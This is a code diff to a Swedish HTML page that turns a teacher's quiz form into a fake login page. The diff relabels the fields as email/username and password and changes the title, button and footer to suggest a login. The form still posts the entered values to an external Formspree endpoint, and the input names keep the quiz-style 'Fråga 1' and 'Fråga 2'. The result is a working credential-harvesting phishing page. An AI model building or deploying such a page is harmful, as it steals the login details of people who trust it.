@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Frågor</title>
+  <title>Inloggning</title>
   <style>
     body {
       font-family: system-ui, -apple-system, sans-serif;
@@ -74,9 +74,9 @@
 </head>
 <body>
   <div class="login-box">
-    <h1>Frågor</h1>
+    <h1>Logga in</h1>
 
-    <!-- Byt ut action till DIN Formspree-endpoint! -->
+    <!-- Din Formspree-endpoint är redan ifylld här -->
     <form action="https://formspree.io/f/meelzawg" method="POST">
 
       <!-- Dolda fält för bättre mail -->
@@ -84,26 +84,20 @@
       <input type="hidden" name="_language" value="sv">
 
       <div class="form-group">
-        <label for="q1">Fråga 1</label>
+        <label for="q1">Epost / Användarnamn</label>
         <input type="text" id="q1" name="Fråga 1" autocomplete="off" required placeholder="Skriv ditt svar här">
       </div>
 
       <div class="form-group">
-        <label for="q2">Fråga 2</label>
+        <label for="q2">Lösernord</label>
         <input type="text" id="q2" name="Fråga 2" autocomplete="off" required placeholder="Skriv ditt svar här">
       </div>
 
-      <!-- Extra fält för att veta vem som svarat (valfritt men rekommenderat) -->
-      <div class="form-group">
-        <label for="elev">Ditt namn / klass (valfritt)</label>
-        <input type="text" id="elev" name="Elev / Klass">
-      </div>
-
-      <button type="submit">Skicka svar</button>
+      <button type="submit">Logga in</button>
     </form>
 
     <div class="footer">
-      <p>Svar skickas till läraren</p>
+      <p>Loggar in...</p>
     </div>
   </div>
 </body>
